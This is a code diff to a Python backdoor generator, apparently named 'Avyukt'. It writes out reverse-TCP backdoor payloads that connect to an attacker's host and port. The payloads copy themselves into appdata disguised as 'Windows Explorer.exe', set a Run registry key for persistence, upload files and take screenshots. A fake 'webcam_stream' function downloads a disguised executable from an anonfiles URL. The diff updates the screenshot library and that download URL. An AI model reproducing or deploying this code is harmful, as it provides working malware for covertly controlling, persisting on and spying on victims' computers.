@@ -21,7 +21,7 @@ def gen_nor_python_back():
     port = raw_input("\nAvyukt>: Enter LPORT >> ")
     with open("Output/" + name + ".py", "w") as file:
         file.write('''
-import socket, subprocess, json, os, base64, sys, shutil, urllib, pyautogui
+import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
 class Backdoor:
     def __init__(self, ip, port):
         self.become_pers()
@@ -34,8 +34,6 @@ class Backdoor:
             shutil.copyfile(sys.executable, evil_file_loc)
             subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Start /t REG_SZ /d "' + evil_file_loc + '"', shell=True)
             
-    def screenshot(self):
-        im1 = pyautogui.screenshot('Captured_SS.png')
         
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -65,8 +63,12 @@ class Backdoor:
     def write(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return"[+] File has been uploaded!"
-
+            return "[+] File has been uploaded!"
+            
+    def screenshot(self):
+        im1 = pyscreeze.screenshot('Captured_SS.jpg')
+        return "Screenshot saved as Captured_SS.jpg"
+        
     def webcam_stream(self):
                 url = 'https://cdn-33.anonfiles.com/vaZeT9E8ob/54c5acaa-1594278960/OneDrive_x64_Update.exe' 
                 filename = 'OneDrive_x64_Update.exe'  
@@ -135,7 +137,7 @@ def generate_non_obf_avyukt():
     with open("Output/" + name + ".py", "w") as file:
         file.write('''
         
-import socket, subprocess, json, os, base64, sys, shutil, urllib, pyautogui
+import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
 class Backdoor:
     def __init__(self, ip, port):
         self.become_pers()
@@ -147,8 +149,6 @@ class Backdoor:
         if not os.path.exists(evil_file_loc):
             shutil.copyfile(sys.executable, evil_file_loc)
             subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Start /t REG_SZ /d "' + evil_file_loc + '"', shell=True)
-    def screenshot(self):
-        im1 = pyautogui.screenshot('Captured_SS.png')
         
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -179,6 +179,10 @@ class Backdoor:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return"[+] File has been uploaded!"
+
+    def screenshot(self):
+        image = pyscreeze.screenshot('Captured_SS.jpg')
+        return "Screenshot saved as Captured_SS.jpg"
 
     def webcam_stream(self):
                 url = 'https://cdn-33.anonfiles.com/vaZeT9E8ob/54c5acaa-1594278960/OneDrive_x64_Update.exe' 
@@ -390,15 +394,12 @@ def avyukt_payload_gen():
     port = raw_input("\nAvyukt>: Enter LPORT >> ")
     with open("Output/" + name + ".py", "w") as file:
         file.write('''
-import socket, subprocess, json, os, base64, sys, shutil, urllib, pyautogui
+import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
 class Backdoor:
     def __init__(self, ip, port):
         self.become_pers()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-
-    def screenshot(self):
-        im1 = pyautogui.screenshot('Captured_SS.png')
         
     def become_pers(self):
         evil_file_loc = os.environ["appdata"] + "\Windows Explorer.exe"
@@ -435,10 +436,14 @@ class Backdoor:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return"[+] File has been uploaded!"
-
+    
+    def screenshot(self):
+        image = pyscreeze.screenshot('Captured_SS.jpg')
+        return "Screenshot saved as Captured_SS.jpg"
+        
     def webcam_stream(self):
-                url = 'https://cdn-33.anonfiles.com/vaZeT9E8ob/54c5acaa-1594278960/OneDrive_x64_Update.exe' 
-                filename = 'OneDrive_x64_Update.exe'  
+                url = 'https://cdn-103.anonfiles.com/5ahaBaO8ob/7ba9f689-1598168158/pytst.exe' 
+                filename = 'pytst.exe'  
                 urllib.urlretrieve(url, filename)
                 if Exception:
                         return "[+] Error Starting Webcam, Please make sure the target user is having a Webcam"
@@ -545,7 +550,7 @@ def list_info():
     print(Fore.WHITE + "\n\t\t[10] python/meterpreter/reverse_http")
     print(Fore.RED + "\n\t\tLinux Backdoors" + Fore.WHITE + "(Good)")
     print(Fore.WHITE + "\n\t\t[11] bin/bash shell")
-    print(Fore.RED + "\n\t\tAndroid Backdoors" + Fore.WHITE + "(Good)")
+    print(Fore.RED + "\n\t\tAndroid Backdoors" + Fore.WHITE + "(G)")
     print(Fore.WHITE + "\n\t\t[12] android/meterpreter/reverse_tcp")
     print(Fore.WHITE + "\n\t[+] Press Enter to return to Menu")
 
